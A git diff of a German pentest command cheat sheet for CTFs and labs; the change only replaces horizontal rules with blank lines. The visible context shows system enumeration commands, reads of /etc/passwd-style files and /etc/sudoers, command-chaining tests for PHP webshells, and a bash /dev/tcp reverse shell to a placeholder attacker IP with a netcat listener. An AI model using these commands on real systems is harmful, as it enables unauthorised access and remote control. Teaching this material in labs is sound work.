@@ -1,6 +1,6 @@
 # 🧪 cmdExamplesFromShell.md
 
----
+
 
 ## Inhaltsverzeichnis
 - [Einleitung](#einleitung)
@@ -16,7 +16,7 @@
 - [Siehe auch](#siehe-auch)
 - [Haftungsausschluss](#haftungsausschluss)
 
----
+
 
 ## Einleitung
 
@@ -27,7 +27,7 @@ Sie eignet sich hervorragend für **CTFs**, **Penetration Testing Labs** oder al
 > Die Befehle dienen ausschließlich **Schulungszwecken** oder autorisierten Tests in isolierten, legalen Umgebungen.  
 > Jeder unautorisierte Zugriff auf Drittsysteme ist illegal und strafbar.
 
----
+
 
 ## Informationsgewinnung
 
@@ -40,7 +40,7 @@ uname -a                # Vollständige Systeminformationen
 uname -r                # Kernel-Version
 ```
 
----
+
 
 <div align=right>
 
@@ -61,7 +61,7 @@ cat /etc/group          # Gruppeninformationen
 cat /etc/sudoers        # Sudo-Rechte überprüfen
 ```
 
----
+
 
 ## Netzwerk-Analyse
 ```bash
@@ -71,7 +71,7 @@ netstat -an             # Offene Ports
 netstat -tulpn          # Dienste mit Ports und PIDs
 ```
 
----
+
 
 ## Systemdienste & Prozesse
 ```bash
@@ -81,7 +81,7 @@ who -a                  # Aktive Benutzer
 w                       # Aktive Sessions
 ```
 
---- 
+ 
 
 <div align=right>
 
@@ -98,7 +98,7 @@ which python                            # Python vorhanden?
 which perl                              # Perl vorhanden?
 ```
 
----
+
 
 ## Kommunikation (Reverse Shells)
 ### Netcat Reverse Shell (Linux)
@@ -115,7 +115,7 @@ bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
 nc -lvnp 4444
 ```
 
----
+
 
 <div align=right>
 
@@ -132,7 +132,7 @@ cat test.txt                  # Datei anzeigen
 rm test.txt                   # Datei löschen
 ```
 
----
+
 
 ## Befehle debuggen (Beispiel in PHP-Webshell)
 Wenn ein Befehl nicht direkt ausgeführt wird (z. B. bei exec()), kann es helfen, einfache Varianten zu testen:
@@ -147,7 +147,7 @@ whoami;id;uname -a
 echo START && whoami && echo END
 ```
 
---- 
+ 
 
 <div align=right>
 
@@ -164,7 +164,7 @@ journalctl -xe             # Systemd-Logs (sofern aktiv)
 tail -f /var/log/auth.log  # SSH/Authentifizierungsversuche
 ```
 
----
+
 
 ## Siehe auch:
 
@@ -172,7 +172,7 @@ tail -f /var/log/auth.log  # SSH/Authentifizierungsversuche
 - [https://github.com/bitRaybytes/cybersecurity/blob/main/04-os-enumeration/post_exploitation_tools.md](https://github.com/bitRaybytes/cybersecurity/blob/main/04-os-enumeration/post_exploitation_tools.md)
 - [https://github.com/bitRaybytes/cybersecurity/blob/main/03-web-security/webshells/php_web_whell_usage.md](https://github.com/bitRaybytes/cybersecurity/blob/main/03-web-security/webshells/php_web_whell_usage.md)
 
----
+
 
 ## Haftungsausschluss
 
